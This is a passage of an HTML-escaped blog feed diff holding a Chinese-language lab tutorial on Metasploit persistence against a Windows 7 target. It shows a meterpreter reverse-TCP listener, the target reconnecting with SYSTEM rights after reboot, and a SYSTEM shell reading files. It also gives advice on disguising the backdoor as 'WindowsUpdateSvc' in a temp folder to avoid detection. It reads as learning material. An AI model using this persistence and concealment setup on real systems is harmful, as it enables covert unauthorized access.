+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS：由于该模块创建了一个持久化服务并且立刻启动了该服务，因此该服务会主动向攻击机发起连接。因此启动该模块后立刻创建了一个新的会话（session 2）。两个会话的权限相同&lt;/p&gt;
+&lt;ol start="2"&gt;
+&lt;li&gt;创建监听器&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端2：监听配置&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; use exploit/multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp &lt;span class="c1"&gt;# 与攻击配置一致&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST 10.0.0.223 &lt;span class="c1"&gt;# 绑定攻击机IP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;4446&lt;/span&gt; &lt;span class="c1"&gt;# 绑定监听端口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;4446&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; ExitOnSession &lt;span class="nb"&gt;false&lt;/span&gt; &lt;span class="c1"&gt;# 即使断开也保持监听&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;ExitOnSession&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="nb"&gt;false&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run -j &lt;span class="c1"&gt;# -j为后台运行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit running as background job 0.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit completed, but no session was created.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4446
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start="3"&gt;
+&lt;li&gt;重启靶机&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端1：（重启靶机，无需登录）原会话断开&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; closed. Reason: Died
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; closed. Reason: Died
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start="4"&gt;
+&lt;li&gt;靶机自动连接监听器&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端2：监听到新的会话连接（SYSTEM权限）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;177734&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4446 -&amp;gt; 10.0.0.17:49205&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 09:09:46 +0000
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; sessions
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Active &lt;span class="nv"&gt;sessions&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Id Name Type Information Connection
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -- ---- ---- ----------- ----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; meterpreter x86/win NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM 10.0.0.223:4446 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; dows @ ANKH-PC 0.0.0.17:49205 &lt;span class="o"&gt;(&lt;/span&gt;10.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .0.17&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; sessions -i &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Starting interaction with 1...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h5 id="相关原理"&gt;相关原理
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;持久化机制&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;生成meterpreter后门程序&lt;/strong&gt; → C:\Windows\TEMP\keQgBw.exe&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;创建Windows服务&lt;/strong&gt; → &amp;ldquo;WindowsUpdateSvc&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;配置服务自动启动（开机自启）&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务指向后门程序路径&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务伪装技巧&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;服务名伪装&lt;/strong&gt;：使用&lt;code&gt;WindowsUpdateSvc&lt;/code&gt;这样的合法名称，避免被轻易发现&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文件路径&lt;/strong&gt;：存放在&lt;code&gt;C:\Windows\TEMP\&lt;/code&gt;，利用系统目录降低怀疑&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限继承&lt;/strong&gt;：服务以SYSTEM权限运行，维持高权限访问&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络通信机制&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;反向连接&lt;/strong&gt;：靶机主动连接攻击机（10.0.0.223:4446）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：可绕过出站防火墙限制（大多数防火墙允许出站连接）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;稳定性&lt;/strong&gt;：即使连接断开也会尝试重连&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="四shell"&gt;四、Shell
+&lt;/h4&gt;&lt;p&gt;在&lt;code&gt;meterpreter&lt;/code&gt;下执行shell可以SYSTEM身份进入靶机终端。由于编码问题（Windows终端采用GBK编码，而Kali终端采用UTF-8编码）shell后可能出现乱码，可以通过指令修改靶机编码方式（&lt;code&gt;chcp 65001&lt;/code&gt;，Windows命令提示符(cmd)中设置代码页(Code Page)的命令）以解决该问题&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Process &lt;span class="m"&gt;1028&lt;/span&gt; created.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Channel &lt;span class="m"&gt;2&lt;/span&gt; created.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Microsoft Windows &lt;span class="o"&gt;[&lt;/span&gt;�汾 6.1.7600&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;��Ȩ���� &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2009&lt;/span&gt; Microsoft Corporation����������Ȩ����
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;chcp &lt;span class="m"&gt;65001&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;chcp &lt;span class="m"&gt;65001&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Active code page: &lt;span class="m"&gt;65001&lt;/span&gt; &lt;span class="c1"&gt;# 936对应GBK，65001对应UTF-8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nt authority&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;cd C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;tree /f
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tree /f Folder PATH listing
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Volume serial number is 000001BD 0014:5107
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Hello.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; hi.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;No subfolders exist
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;type Hello.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;type&lt;/span&gt; Hello.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hello?
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;exit
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item><item><title>渗透测试基础</title><link>http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</link><pubDate>Tue, 30 Dec 2025 14:51:56 +0800</pubDate><guid>http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</guid><description>&lt;h1 id="渗透测试基础"&gt;渗透测试基础
 &lt;/h1&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;概述&lt;/strong&gt;：通过各种手段对目标进行渗透攻击，通过渗透来测试目标的安全防护能力&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;底层基础&lt;/strong&gt;：目标系统中存在安全漏洞（Loophole，指信息系统中存在的缺陷或不适当的配置，其可使攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险）&lt;/li&gt;
